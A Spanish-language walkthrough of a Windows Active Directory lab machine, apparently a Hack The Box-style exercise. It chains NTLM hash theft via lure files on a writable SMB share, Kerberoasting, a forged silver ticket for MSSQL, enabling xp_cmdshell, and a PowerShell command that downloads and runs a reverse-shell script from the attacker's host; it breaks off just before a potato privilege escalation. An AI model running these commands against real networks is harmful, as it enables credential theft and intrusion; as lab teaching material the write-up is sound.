# Resolución maquina Authority

**Autor:** PepeMaquina.
**Fecha:** 26 de Marzo de 2026.
**Dificultad:** Medio.
**Sistema Operativo:** Windows.
**Tags:** NTLM_THEFT, Silver Ticket, Impersonate.

---
## Imagen de la Máquina

![](breach.jpg)

*Imagen: Breach.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo del dominio con rustscan para identificar servicios expuestos:
~~~ bash
rustscan -a 10.129.9.120 --ulimit 5000 -- -A -sS -Pn -oN rustscan_initial.txt
~~~
Aprovechando esto realiza un escaneo automático y detallado de puertos abiertos:
~~~ bash
[~] Automatically increasing ulimit value to 5000.
Open 10.129.9.120:53
Open 10.129.9.120:80
Open 10.129.9.120:88
Open 10.129.9.120:135
Open 10.129.9.120:139
Open 10.129.9.120:389
Open 10.129.9.120:445
Open 10.129.9.120:464
Open 10.129.9.120:593
Open 10.129.9.120:636
Open 10.129.9.120:1433
Open 10.129.9.120:3268
Open 10.129.9.120:3269
Open 10.129.9.120:3389
Open 10.129.9.120:9389
Open 10.129.9.120:49664
Open 10.129.9.120:49677
Open 10.129.9.120:49918
Open 10.129.9.120:49668
Open 10.129.9.120:56792
~~~
### Enumeración de Servicios
~~~bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-27 19:35:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.9.120:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.9.120:1433: 
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-27T19:36:40+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49918/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56792/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=3/27%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69C6DC6D%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=A)
SEQ(SP=108%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.007 days (since Fri Mar 27 15:27:31 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46822/tcp): CLEAN (Timeout)
|   Check 2 (port 53565/tcp): CLEAN (Timeout)
|   Check 3 (port 4033/udp): CLEAN (Timeout)
|   Check 4 (port 62185/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-27T19:36:41
|_  start_date: N/A
|_clock-skew: mean: 5s, deviation: 0s, median: 5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
~~~
Se puede ver que es un AD, esto esta mas que claro porque se puede ver el servicio kerberos en el puerto 88.
### Enumeración de nombre del dominio
Lo primero es obtener el nombre del dominio y la maquina.
~~~bash
┌──(kali㉿kali)-[~/htb/breach/nmap]
└─$ sudo netexec smb 10.129.9.120 -u '' -p ''                                     
[sudo] password for kali: 
SMB         10.129.9.120    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False) 
SMB         10.129.9.120    445    BREACHDC         [+] breach.vl\: 
~~~
Se tiene un dominio y nombre del DC, esto debe agregarse al `/etc/hosts`.
~~~bash
┌──(kali㉿kali)-[/opt/bloodhound-ce]
└─$ cat /etc/hosts | grep '10.129.9.120' 
10.129.9.120 BREACHDC breach.vl BREACHDC.breach.vl
~~~
Con el dominio agregado, se realiza enumeración de recursos compartidos, esto no acepta acceso con credenciales nulas, pero si las acepta con credenciales de invitado.
~~~bash
┌──(kali㉿kali)-[~/htb/breach/nmap]
└─$ sudo netexec smb 10.129.9.120 -u 'sd' -p '' --shares
SMB         10.129.9.120    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False) 
SMB         10.129.9.120    445    BREACHDC         [+] breach.vl\sd: (Guest)
SMB         10.129.9.120    445    BREACHDC         [*] Enumerated shares
SMB         10.129.9.120    445    BREACHDC         Share           Permissions     Remark
SMB         10.129.9.120    445    BREACHDC         -----           -----------     ------
SMB         10.129.9.120    445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.9.120    445    BREACHDC         C$                              Default share
SMB         10.129.9.120    445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.9.120    445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.9.120    445    BREACHDC         share           READ,WRITE      
SMB         10.129.9.120    445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.9.120    445    BREACHDC         Users           READ  
~~~
### NTLM THEFT
Lo primero que resalta a la vista es que se tiene acceso de escritura sobre un recurso compartido "share", normalmente no se deberia de tener acceso para subir archivos, ante esta situación lo primero que se realiza segun mi metodologia es realizar una ataque `ntlm_theft`, por si existe un usuario por detras que ingresa al recurso y se podria robar sus credenciales NTLMv2.
Para ello se emplea un repositorio github (https://github.com/Greenwolf/ntlm_theft) y se crea los archivos.
~~~bash
┌──(kali㉿kali)-[~/htb/breach/exploits/ntlm_theft]
└─$ python ntlm_theft.py -g all -s 10.10.14.28 -f test
~~~
Este script crea varios archivos para que al ingresar en alguno este pase las credenciales NTLMv2 a un servidor propio, en este caso se emplea responder.
~~~bash
┌──(kali㉿kali)-[~/htb/breach/exploits/ntlm_theft]
└─$ cd test 
                                                                                                                                                            
┌──(kali㉿kali)-[~/…/breach/exploits/ntlm_theft/test]
└─$ ls
 Autorun.inf       'test-(externalcell).xlsx'   test.htm                      test.library-ms  'test-(remotetemplate).docx'   test.theme
 desktop.ini       'test-(frameset).docx'      'test-(icon).url'              test.lnk          test.rtf                     'test-(url).url'
 test.application  'test-(fulldocx).xml'       'test-(includepicture).docx'   test.m3u          test.scf                      test.wax
 test.asx          'test-(handler).htm'         test.jnlp                     test.pdf         'test-(stylesheet).xml'        zoom-attack-instructions.txt
~~~
Ahora se debe subir todos los archivos.
~~~bash
┌──(kali㉿kali)-[~/…/breach/exploits/ntlm_theft/test]
└─$ smbclient '//10.129.9.120/Share' -U 'ad'
Password for [WORKGROUP\ad]:
Try "help" to get a list of possible commands.
smb: \> prompt false
smb: \> ls
  .                                   D        0  Fri Mar 27 16:21:47 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

                7863807 blocks of size 4096. 1561745 blocks available
smb: \> cd transfer\
lsmb: \transfer\> ls
  .                                   D        0  Mon Sep  8 06:13:44 2025
  ..                                  D        0  Fri Mar 27 16:21:47 2026
  claire.pope                         D        0  Thu Feb 17 06:21:35 2022
  diana.pope                          D        0  Thu Feb 17 06:21:19 2022
  julia.wong                          D        0  Wed Apr 16 20:38:12 2025

                7863807 blocks of size 4096. 1561745 blocks available
smb: \transfer\> mput *
putting file test.application as \transfer\test.application (3.9 kb/s) (average 3.9 kb/s)
<----SNIP---->
~~~
Esperando a que todo se suba, es cosa de abrir responder y esperar alguna conexion.
~~~bash
┌──(kali㉿kali)-[~/htb/breach/nmap]
└─$ sudo responder -I tun0                                                                                                
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.28]
    Responder IPv6             [dead:beef:2::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-VLE9YSX0LS0]
    Responder Domain Name      [AZLU.LOCAL]
    Responder DCE-RPC Port     [46137]

[+] Listening for events...                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.9.120
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:cb631fb3a7ed5822:9A5D735681234FDE6F38E9DEDB1EF8A4:010100000000000080F3032B07BEDC01DD4301A6C6A1A484000000000200080041005A004C00550001001E00570049004E002D0056004C004500390059005300580030004C005300300004003400570049004E002D0056004C004500390059005300580030004C00530030002E0041005A004C0055002E004C004F00430041004C000300140041005A004C0055002E004C004F00430041004C000500140041005A004C0055002E004C004F00430041004C000700080080F3032B07BEDC0106000400020000000800300030000000000000000100000000200000C7A1065DFD035E176C691699DC5F5DA38F336AF7C8152739C1FE5133ADFA087D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000
~~~
Se logro capturar un hash, descifrando este se puede ver que si contiene una contraseña vulnerable.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ sudo john hash_julia --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Computer1        (Julia.Wong)     
1g 0:00:00:00 DONE (2026-03-27 16:33) 9.090g/s 1098Kp/s 1098Kc/s 1098KC/s bratz1234..042602
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
~~~
Con una credencial valida, primero se ingresa a los recursos compartidos nuevamente ya que se tenian nombres de usuarios y posiblemente se necesite acceso con credenciales validos para ver su contenido.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ smbclient '//10.129.9.120/Share' -U 'Julia.Wong'
Password for [WORKGROUP\Julia.Wong]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 27 16:21:47 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Fri Mar 27 16:32:17 2026

                7863807 blocks of size 4096. 1560871 blocks available
smb: \> cd transfer\
smb: \transfer\> ls
  .                                   D        0  Fri Mar 27 16:32:17 2026
  ..                                  D        0  Fri Mar 27 16:21:47 2026
  Autorun.inf                         A       79  Fri Mar 27 16:32:16 2026
  claire.pope                         D        0  Thu Feb 17 06:21:35 2022
  desktop.ini                         A       47  Fri Mar 27 16:32:17 2026
  diana.pope                          D        0  Thu Feb 17 06:21:19 2022
  julia.wong                          D        0  Wed Apr 16 20:38:12 2025
  test-(externalcell).xlsx            A     5856  Fri Mar 27 16:32:13 2026
  test-(frameset).docx                A    10224  Fri Mar 27 16:32:08 2026
  test-(fulldocx).xml                 A    72585  Fri Mar 27 16:32:18 2026
  test-(handler).htm                  A      114  Fri Mar 27 16:32:07 2026
  test-(icon).url                     A      108  Fri Mar 27 16:32:08 2026
  test-(includepicture).docx          A    10217  Fri Mar 27 16:32:14 2026
  test-(remotetemplate).docx          A    26284  Fri Mar 27 16:32:15 2026
  test-(stylesheet).xml               A      163  Fri Mar 27 16:32:16 2026
  test-(url).url                      A       56  Fri Mar 27 16:32:10 2026
  test.application                    A     1650  Fri Mar 27 16:32:06 2026
  test.asx                            A      147  Fri Mar 27 16:32:10 2026
  test.htm                            A       79  Fri Mar 27 16:32:07 2026
  test.jnlp                           A      192  Fri Mar 27 16:32:12 2026
  test.library-ms                     A     1219  Fri Mar 27 16:32:13 2026
  test.lnk                            A     2164  Fri Mar 27 16:32:09 2026
  test.m3u                            A       49  Fri Mar 27 16:32:11 2026
  test.pdf                            A      770  Fri Mar 27 16:32:07 2026
  test.rtf                            A      103  Fri Mar 27 16:32:12 2026
  test.scf                            A       85  Fri Mar 27 16:32:11 2026
  test.theme                          A     1660  Fri Mar 27 16:32:11 2026
  test.wax                            A       56  Fri Mar 27 16:32:09 2026
  zoom-attack-instructions.txt        A      116  Fri Mar 27 16:32:09 2026
c
                7863807 blocks of size 4096. 1560871 blocks available
smb: \transfer\> cd julia.wong\
smb: \transfer\julia.wong\> ls
  .                                   D        0  Wed Apr 16 20:38:12 2025
  ..                                  D        0  Fri Mar 27 16:32:17 2026
  user.txt
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Con acceso smb con un usuario valido se puede ver la bandera.
~~~bash
smb: \transfer\julia.wong\> get user.txt 
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

┌──(kali㉿kali)-[~/htb/breach]
└─$ cat user.txt    
<Encuentre su propia user flag>
~~~

---
## Escalada de Privilegios
### Kerberoasting
Con una credencial valida, siguiendo mi metodologia y sabiendo que existe un puerto 1433 abierto, lo mas probable es que exista una cuenta de servicio para `mssql`, normalmente cuando se tiene cuentas de servicio estos son muy probables de ser vulnerables a kerberoasting, entonces nunca esta de mas probarlo.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ impacket-GetUserSPNs breach.vl/Julia.Wong:Computer1 -dc-ip 10.129.9.120 -request
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106169  2026-03-27 15:30:13.201959             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$96dcb8b921ac4d1262f229de739ceb49$c34c0d05d24c4e52a38edfda0d2cc650ee2a0dacb5fd6dd6e55c6e47c250df22f4c30603ec429b1f4851374f8c1d119af509f0c344a4a550bdc705d29e97fa58250e2e27b8870cf7aee4c4a43d80dbae906e1248b58905fe9c235cfd8da2e200b514e63b69b1e910f468f115cf63a5ddb34a898d79ea1d74023c353ac1688b14d766bae98fa8166ee555d7c6cd441016983ac2347750aed690e3bca2a8a26a955412adf16f29a30d6ef0c328559cce78307a0a7bad3c1a22e8dea4f9967a366caffda936fbf44843bd31a8d1f1d72ed01ce9c1c99ba83a1f64fc91897755a97cb88feec855e3b84fe3cc068eff2298030289d70d5936472d40756c90dee07ff36c4c88460e53c3ecdac35e27838298d40cc691c360ade75e8c7fe1de52ab05e8842c8a98cde69734e2d402f8c1c003a8b9ba889b2a353c3305f392d86e3c4f4ddd9c5cae12c290f016973f25bd37cb20264ec2c2b3b96fca72d397517438465ed815c92c87b821bdf08a6520a7318e6848427be549ccac96adf7b9f357a5661cc4260656e6ede1868ca1009c9341fa1010546400784d2c34f179787d26dc19b223e5be82fa1b3f5fca6656afaa3762c59ca4519fc9024b31db09846778fad31f8fdf1f1f22be0ee591e1bc465d4d1b6e971cafe08daaa009ef01fa7c574e643ba04cdfa85cf436e4e11f66a670fe68fc857c099be61d1ebd61f57aebd50e945fce1b6f12465f4babda2e8f1347badc57c3689064ac968891389f9b124a46d73f4bd25636629e14916d427eda8bdc6981a6b6c2fe43065c5b03714c4e73ef97219707ed4046b3f1005efac769a8174b2bff90dbc994e292e3b1f5ae17bcf2964cfa5531263d7d12b8237a5f4241a534c170013a0d1c2bfc63e4e246cbd64159fe6f15f9d2da4b5aac5ffa55d0b0c6b57d0ebde42c215c215d4839490e1849352f487eb2182a7ba267fccc8562899b18f064dff92210efa2fe84f6bb65bb7037dcfb218bf50a2c9d21c14c9950bbb15a6de9a674c45ee305cc38de2a2515ae923f4cdc0d839e419bad5fa57ba3ebcfe2e90b316dd18f2429d115450157a8c24c372673ddbbc44cb9f1113ca7cf759a783cb87a78de8f61ebc57e5d975fe584b14f2c0b53eface54b6aa73bd48cf0cb30a275e373362535b5a1e09ea46d0127f65b6080e3b633f044ce50ebc60854a3bb0a2ecffe02bab591c778d707b17b534442721318e17d363fd9a3577b40b752a859ea5eabd6521e00a348a11938ee3b78ced5e495806e0a157d9e95651f7c9a25a471744a705a0da69c0099419971cf2fcd6ae2759ca8f4b23f20f6cc8f3b2ba371447c0debe765857ef8e7302430baaa2e5f289f9cdab27b8f6346f50e16481b15a4bbddf84266bc3a6a5654f930c54d63ef527e5e123b338b27b417dc261fd9354fe1c26c76309dfb177d7fd7a0276e151cced4ea062f0367be9fcb1e7ca76c2d59e61ca4
~~~
Si se logro obtener un hash para el usuario `svc_mssql`, normalmente estos hashes no suelen ser descifrables, pero este si.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ sudo john hash_mssql --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)     
1g 0:00:00:00 DONE (2026-03-27 16:39) 11.11g/s 580266p/s 580266c/s 580266C/s chloelouise..lili12
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
Con una credencial valida, lo mas conveniente es acceder y ver si se puede ejecutar `xp_cmdshell` para obtener una sesion ya que estas cuentas de servicio suelen tener permisos elevados como Impersonate.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ impacket-mssqlclient 'breach.vl/svc_mssql:Trustno1@10.129.9.120' -windows-auth
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)>
~~~
Si se logro obtener una conexion, pero por mala suerte este no tiene acceso a una shell, tampoco tiene acceso a habilitarla.
~~~bash
SQL (BREACH\svc_mssql  guest@master)> xp_cmdshell "whoami"
ERROR(BREACHDC\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (BREACH\svc_mssql  guest@master)> EXEC sp_configure 'show advanced options', 1;
ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
~~~
Luego de realizar una enumeracion detallada, no se logro obtener algun tipo de acceso.
### Silver Ticket
Normalmente este tipo de cuentas de servicio puede ser vulnerable a un ataque `silver ticket` para impersonar los permisos de `administrator` pero solamente dentro del mismo servicio `mssql`, esto con el fin de que tenga permisos mayores y pueda habilitar una shell.
Para crear un silver ticket, se necesita el SID del dominio, la contraseña en formato RC4 y el SPN, el SPN se logro observar en el ataque kerberoasting, para ver el SID se lo puede ver directamente el mssql pero sale en formato hexadecimal, la opcion mas facil es usar impacket.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ impacket-lookupsid "breach/svc_mssql:Trustno1@10.129.9.120" -domain-sids
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.9.120
[*] StringBinding ncacn_np:10.129.9.120[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
<----SNIP---->
~~~
Se tiene el SID, para obtener la contraseña en NTLM se puede usar pypykatz u la misma bash.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ printf 'Trustno1' | iconv -f utf-8 -t utf-16le | openssl dgst -md4
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/breach]
└─$ pypykatz crypto nt 'Trustno1'     
69596c7aa1e8daee17f8e78870e25a5c
~~~
Y finalmente se puede obtener un ticket impersonando al administrator.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid "S-1-5-21-2330692793-3312915120-706255856" -domain "breach.vl" -spn "MSSQLSvc/breachdc.breach.vl:1433" -user-id 500  Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
~~~
Con el ticket obtenido se puede importarlo en memoria e iniciar sesion en mssql.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ export KRB5CCNAME=$(pwd)/Administrator.ccache
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/breach]
└─$ klist       
Ticket cache: FILE:/home/kali/htb/breach/Administrator.ccache
Default principal: Administrator@BREACH.VL

Valid starting       Expires              Service principal
03/27/2026 17:46:11  03/24/2036 17:46:11  MSSQLSvc/breachdc.breach.vl:1433@BREACH.VL
        renew until 03/24/2036 17:46:11
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/breach]
└─$ mssqlclient.py -k -no-pass BREACHDC.breach.vl                                                                             
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)>
~~~
Con este acceso ahora si se tiene permisos elevados y se podria habilitar la ejecucion de comandos para enviar una shell.
~~~bash
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "whoami"
output             
----------------   
breach\svc_mssql   

NULL 
~~~
Para esto se realiza una reverse shell, se emplea la famosa `Invoke-PowerShellTcp.ps1`, agregando al final el:
~~~
<----SNIP---->
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.28 -Port 4433
<----SNIP---->
~~~
Para que se invoque directamente, Recordar que tambien es importante abrir un puerto para trasferir el archivo.
En mssql se ejecuta directamente.
~~~bash
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'powershell -c "cd C:\users\svc_mssql; IEX(New-Object Net.WebClient).DownloadString(''http://10.10.X.X/p2.ps1'')"';
~~~
Desde otra terminal se coloca un escucha y re logra recibir una shell.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ rlwrap -cAr nc -nvlp 443                                                        
listening on [any] 443 ...
connect to [10.10.14.28] from (UNKNOWN) [10.129.9.120] 58225
Windows PowerShell running as user svc_mssql on BREACHDC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\users\svc_mssql>
~~~
Enumerando sus permisos, este tiene privilegios de Impersonate.
~~~bash
PS C:\users\svc_mssql> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\users\svc_mssql> 
~~~
Con esto es simple, se puede utilizar un `potato` y ejecutar comandos como Authority/System.
Se pasan los archivos `nc64.exe` y `GodPotato.exe`, con ello se ejecuta la reverse.
~~~bash
